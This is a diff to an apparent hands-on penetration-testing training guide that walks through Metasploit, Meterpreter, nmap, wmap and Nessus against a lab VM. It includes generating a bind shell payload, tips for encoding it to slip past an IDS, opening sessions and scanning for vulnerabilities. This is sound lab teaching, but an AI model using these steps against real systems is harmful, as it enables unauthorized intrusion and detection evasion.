@@ -1,23 +1,23 @@
-
+﻿
 **********************************************
 Straightforward Training™
 Using Metasploit/Meterpreter/Nessus (Advance)
 Author: Saulo S. Ortiz
 Date: 20180602
-Updated 20180609
+Updated 20180618
 ~~~ IN PROGRESS BUT USABLE ~~~
 **********************************************
 
 DISCLAIMER
 1.	The steps gathered in this guide come from several different sources. I claim no authorship to them, just authorship on
-putting this guide together and step simplification.
+	putting this guide together and step simplification.
 
 2.	As always, I am not responsible for any issues/damages to hardware or software by using any of the software mentioned in
-this guide nor following it…do so at your own risk. I have tested these steps myself and found no issues/damage to my own systems.
+	this guide nor following it…do so at your own risk. I have tested these steps myself and found no issues/damage to my own systems.
 
 3.	You need to have some basic Linux understanding to be able to follow this guide, like installing and configuring your distro
-in a VM as well as basic VM experience. I will not be covering these steps in (noob) detail…these steps are NOT for people that
-have no idea how to install, remove, update/upgrade and configure Linux. Some commands will be mentioned but to a minimum.
+	in a VM as well as basic VM experience. I will not be covering these steps in (noob) detail…these steps are NOT for people that
+	have no idea how to install, remove, update/upgrade and configure Linux. Some commands will be mentioned but to a minimum.
 
 WHAT YOU’LL NEED
 1.	A host computer with minimum:
@@ -90,11 +90,13 @@ STAGE #1: SETUP
 	b.	Select Home, Professional or Manage
 	c.	Go to https://www.tenable.com/products/nessus-home
 	d.	Wait about 8-10 minutes for plugin downloads to complete
+
 ----------------------------------------------------------------------------------------------------------------------------------------
 Note: When trying to do these steps after setup you’ll need to do the following:
 	1.	Start Nessus service: /etc/init.d/nessusd start
 	2.	Go to the https link as before
 ----------------------------------------------------------------------------------------------------------------------------------------
+
 
 STEP #2: INTRO TO METASPLOIT
 Default login info is:
@@ -126,6 +128,7 @@ Note: Type help and the command to get more information about it
 	c.	Type show options
 	d.	Type back to return to the msf shell
 		i.	…the settings we just did will become null
+
 ----------------------------------------------------------------------------------------------------------------------------------------
 Note: Remember to use autocomplete using your Tab button
 ----------------------------------------------------------------------------------------------------------------------------------------
@@ -154,6 +157,7 @@ Note: Remember to use autocomplete using your Tab button
 		i.	…nothing shows up for this exploit but others may have info
 	f.	Type show targets to see the targets you can use this against
 
+
 STEP #3: CREATE A BIND SHELL PAYLOAD
 1.	Type use payload/windows/shell_bind_tcp
 
@@ -162,6 +166,7 @@ STEP #3: CREATE A BIND SHELL PAYLOAD
 3.	Type generate –h to see options
 
 4.	Type generate to generate a shell code
+
 ----------------------------------------------------------------------------------------------------------------------------------------
 Note: A bind_tcp_shell will bind us to a port on the target to get a shell.
 ----------------------------------------------------------------------------------------------------------------------------------------
@@ -171,6 +176,7 @@ Note: A bind_tcp_shell will bind us to a port on the target to get a shell.
 
 6.	Type generate again
 	a.	Notice the set parameters are in the payload
+
 ----------------------------------------------------------------------------------------------------------------------------------------
 Note: An IDS may be able to notice this payload and block it. If you knew which portion of this code triggers the IDS then you can edit it by using the command.
 The most common bytes of this payload that can trigger an IDS are \xff and \x50.
@@ -186,9 +192,11 @@ The most common bytes of this payload that can trigger an IDS are \xff and \x50.
 		i.	…could not complete with \x50 in it
 		ii.	…what’s the byte size?
 		iii.	…you can use formats...go to help for these
+
 ----------------------------------------------------------------------------------------------------------------------------------------
 Note: -i 3 iterates the code 3 times…meaning, code and recode up to 3 times. This supposedly makes the payload harder to detect.
 ----------------------------------------------------------------------------------------------------------------------------------------
+
 
 STEP #4: OTHER MSFCONSOLE COMMANDS
 1.	With workspace you can have multiple screens areas where you can run commands independent from others. Like using Shift + Ctrl + T.
@@ -258,6 +266,7 @@ this section we’ll try to get a shell through the postgresql database running 
 	l.	Type ps …to see the processes running
 		i.	…you get even more info on what is running and get an idea what to do next
 	m.	Type sysinfo
+
 ----------------------------------------------------------------------------------------------------------------------------------------
 Note: When you background a session it “kicks you out” and places that session in the background for later use…you’re not really kicked out…it’s more
 like putting your call on-hold then you can come back to it without having to go through the entire connection process. Do sessions to see how the session
@@ -266,6 +275,7 @@ is set in the background.
 
 10.	Type exit to drop out of the meterpreter shell
 		i.	…if you’re running processes you can Ctrl+C then exit
+
 
 STEP #6: SCANNING WITH MSFCONSOLE (Part #1)
 1.	Type hosts
@@ -280,6 +290,7 @@ STEP #6: SCANNING WITH MSFCONSOLE (Part #1)
 	a.	nmap –A <rhost_ip_address>
 		i.	…you can pipe the results to a .txt file and you can also grep it
 		ii.	…you can also use the –vv to see results while scanning
+
 ----------------------------------------------------------------------------------------------------------------------------------------
 Note: We show the following services with ports: FTP, ssh, telnet, smtp, apache, rpcbind, netbios (Samba), a remote shell, a root shell, java, another
 FTP, MySQL, VNC, x11, unreal gaming server irc, two more apache servers, MAC address, etc. Lots of things to exploit.
@@ -300,6 +311,7 @@ FTP, MySQL, VNC, x11, unreal gaming server irc, two more apache servers, MAC add
 		i.	…this command uses rhosts NOT rhost to set the IP address
 	d.	Type exploit or run
 		i.	…once the scan is done, we’ll see the open TCP ports
+
 
 STEP #7: SCANNING WITH MSFCONSOLE (Part #2)
 Using the command services –u (same as services) we can see what programs the target has running and we can scan and exploit. Once you
@@ -348,6 +360,7 @@ have a target always use this command!
 		i.	…shows you protocol, port and its state
 		ii.	…try it using another port
 		iii.	…if you want all info then omit the rest of the command after 21
+
 ----------------------------------------------------------------------------------------------------------------------------------------
 Note: At this point you can view every successful attempt by typing creds. This information is stored in the database and shows your successful connections
 along with important information.
@@ -363,14 +376,125 @@ along with important information.
 	a.	Type options
 		i.	…check the rhosts info
 	b.	Type run (or exploit)
-		i.	…it found the VNC protocol version [3,  4].3…you can also see this using services
+		i.	…it found the VNC protocol version [3,4]…you can also see this using services
 		ii.	…it did not find it to have a blank password authentication
 		iii.	…continue to identify how to get in using the data you see here and also using services -u
+
 
 STEP #8: WEB APPLICATION SCANNING WITH MSFCONSOLE
 1.	Go back then type services
 
 2.	Using the browser we’ll see what we can see under the IP address and port 80…what program in the list is the one using port 80?
+	a.	In the browser type the target’s IP address…what do you see here?
+		i.	…these links connect to vulnerable web applications!
 
-3.	In the browser type the target’s IP address…what do you see here?
-	a.	These links connect to vulnerable web applications
+3.	Type load wmap framework plugin
+		i.	…this is a webcrawler
+
+4.	Type help and scroll up until you see map Commands
+
+5.	Type wmap _sites
+		i.	…check out the options
+
+6.	Type wmap_sites –a <http://metasploit_IP>
+		i.	…this command adds a website to metasploit
+	a.	Type wmap_sites –l to see if it was created
+
+7.	Type wmap_targets –h
+
+8.	Type wmap_targets –t <http://metasploit_IP>
+
+9.	Type wmap_targets –l
+		i.	…you can also add SSL
+
+10.	Type wmap_run –h
+
+11.	Type wmap_run –t
+		i.	…used to ID any enabled modules
+		ii.	…the modules can be used against the website we initially set up
+
+12.	Type wmap_run –e
+		i.	…to launch all the modules against the contents on the root folder of metasploit and see what vulnerabilities it can find
+
+13.	Type wmap_vulns –l
+		i.	…it displays all the vulnerabilities found
+
+
+STEP #9: SCANNING WITH NESSUS
+We can connect to Nessus via the web browser or though msf console...we’ll start with the console.
+
+1.	Ctrl+L to clear then exit msf
+
+2.	Run Nessus…
+	a.	Type /etc/init.d/nessus start
+	b.	Check if its running using service --status-all | grep ness
+		i.	…you can also use service nessusd start
+		ii.	…and check with service nessusd status
+
+3.	Go back into msf…
+	a.	Type msfconsole
+
+4.	Type load nessus
+		i.	…it should say successfully loaded, if not, check if its running or if its installed
+
+5.	Type nessus_help to check any options
+
+6.	Let try and connect to Nessus via the terminal…
+	a.	Type nessus_connect –h for more options on how to connect
+
+7.	Now let’s save our Nessus credentials…do not do this on a real network or in an open network…do all in a VM network in NAT
+	a.	Type nessus_save <username/password>
+	b.	Type ifconfig and find the IP address if you do not have it already
+	c.	Type nessus_connect <username:password>@<host_ip>:8834
+		i.	…it should read user authenticated successfully
+		ii.	…you may need to add at the end ssl_ignore
+	d.	Type nessus_help
+	e.	Type nessus_user_list
+	f.	Type nessus_admin
+
+-------------------------------------------------------------------------------------------------------------------------------
+Note: As this is a brand new Nessus installation there will be no policies available, therefore you need to create some via the GUI before we can continue.
+-------------------------------------------------------------------------------------------------------------------------------
+
+8.	Go to the browser and type https:<host_ip_address>:8834
+	a.	Use your login and password
+	b.	On the left side menu select Policies
+	c.	On the middle screen select Create a new policy
+	d.	Select Basic Scan then name basic_scan then save it
+
+9.	Back at the terminal screen type nessus_policy_list
+
+10.	Type nessus_scan_new…noticed its missing info to run it
+
+11.	Type nessus_policy_list and copy the UUID to memory
+
+12.	Type nessus_scan_new <UUID_#> test test <host_ip_address>
+	a.	Or type nessus_scan_new <UUID_#> test test <host_ip_range>/24
+		i.	…you’ll need the entire UUID number 
+
+-------------------------------------------------------------------------------------------------------------------------------
+Note: Take note of the Scan ID because you did not launched the scan, you just create a queue
+-------------------------------------------------------------------------------------------------------------------------------
+
+13.	Type nessus_scan_launch <scan_ID>
+
+14.	Type nessus_scan_list …to see running scans…this will take  while
+	a.	Type nessus_scan_list again to see if the scan completed
+		i.	…take note of the Scan ID
+
+15.	Type nessus_report_hosts <scan_ID>
+		i.	…it will show you the finding %
+		ii.	…take note of the Host ID
+
+16.	Type nessus_report_vulns <scan_ID>
+		i.	…it will show you the vulnerabilities found
+
+17.	Type nessus_report_host_details <scan_ID> <host_ID>
+
+18.	Type nessus_scan_export 
+		i.	…to see the syntax and the formats you can use to export reports from Nessus
+		ii.	Use nessus_scan_list to find the Scan ID
+-------------------------------------------------------------------------------------------------------------------------------
+Note: Of course you can do all this via the GUI and it would be faster and easier…I just wanted to have you use the terminal screen to see it also works.
+-------------------------------------------------------------------------------------------------------------------------------
+
